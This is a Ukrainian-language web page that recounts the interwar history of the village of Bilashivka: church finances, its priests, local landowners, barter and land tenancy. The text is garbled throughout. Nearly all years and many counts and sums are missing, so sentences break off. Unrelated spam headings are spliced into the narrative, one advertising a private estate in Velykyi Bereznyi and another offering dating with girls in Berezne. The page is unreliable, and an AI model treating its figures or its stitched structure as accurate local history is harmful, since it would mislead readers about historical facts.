	<p>Церковні відомості говорять, що церковні землі приносять 15 тисяч марок в рік прибутку, а сама церква заробляє 20 тисяч польських марок в рік. Отже зрозуміло, що вже в році в селі були запроваджені польські гроші. Але богослужіння ведеться за православним обрядом. За переписом населення Білашівки вже в році становило чоловіки з них чоловіків та жіночого населення, а дворів було  Село в — роки відноситься до Березнівської гміни. Костопільського повіту Волинського воєводства. В році релігійні обряди в храмі Івана Богослова проводилися за православним обрядом, які здійснює Василь Карпович Закидальський.</p>
<p>У році було проведено ремонт храму, на якій було затрачено 2 тисячі злотих. Ці гроші надали жителі села. Церкву було пофарбовано. Отже, у селі була знову змінена грошова система. В році в селі нараховувалось двори та чоловіків і жінка, тобто чоловік. В році храм було застраховано на суму 4 тисячі злотих, щорічно вносилася сума 32 злотих. Священиком був Олександр Павлович Травка, який отримував злотих, а псаломщик Борис Петров злотих. Один гектар землі коштував 10 злотих. Річний дохід від церковної землі становив злотих. На церковну землю є план, який було зроблено землеміром Перо і виданий повітовим комісаром м.</p>
<p>Багатою людиною у селі був пан Бендик.</p><strong><a id='p2'></a><h2>Великий Березний Приватна садиба ЛІСКОВЕЦЬ у Великому Березному адреса, відгуки, фото, ціни </h2></strong><p>Його маєток розміщувався на пагорбі, який тепер називають Бендикова гора. Його землі знаходились на північ та на схід від села. Також панські землі були на місці сучасної школи та в південне — західній частині села. Жителі села змушені були найматися до пана тому, що прожити за рахунок своєї землі-було неможливо. Гроші важливої функції не відігравали, тому в селі в основному йшов товарообмін.</p>
<p>Коли селянин хотів придбати певні речі, він брав надлишок своєї продукції і йшов у магазин. Саме в магазині здійснювався товарообмін.</p><strong><a id='p3'></a><h2>Знайомства з дівчинами в місті Berezne</h2></strong><p>Наприклад, за один кілограм сушених грибів можна було отримати 15 марок і купити на них голку та катушку ниток. Зі спогадів Іванової Євдокії Іванівни  р. найбільші земельні володіння в селі мав пан Малинський. В село пан не приїзджав, але в нього був свій посадник на ім'я Віцьо. Життя було тяжким тому, щоб вижити селяни змушені були брати землю в оренду в пана Малинського. А під час збирання урожаю з цієї землі вони віддавали із зібраних 5 снопів жита 2 віддавали панові.</p>
<p>Та бригада, яка збирала податки низалася «мойот». Приміщення цієї бригади знаходилось в Михайлині. Керував цією бригадою пан Струк. Землі, які знаходились за річкою Комарня, називались фондовськими, тобто землі запасу. Ці землі заросли чагарниками. Селяни, у яких було мало землі, викорчовували чагарники і займалися землеробством, але ці землі були мало родючі.</p>
<p>Після посадника Віцьо землі в оренду пана Малинського взяла єврейка Нехля. Вона володіла землями до приходу німців, а коли прийшли німці то її було вбито. Паном лісовчиком лісник був Єлько Кур'ята. В його обов'язки входило: контролювати за вирубкою лісу, вказувати на ділянку для вирізування сухих дерев та слідкувати за збиранням чорниць.</p>
		
			
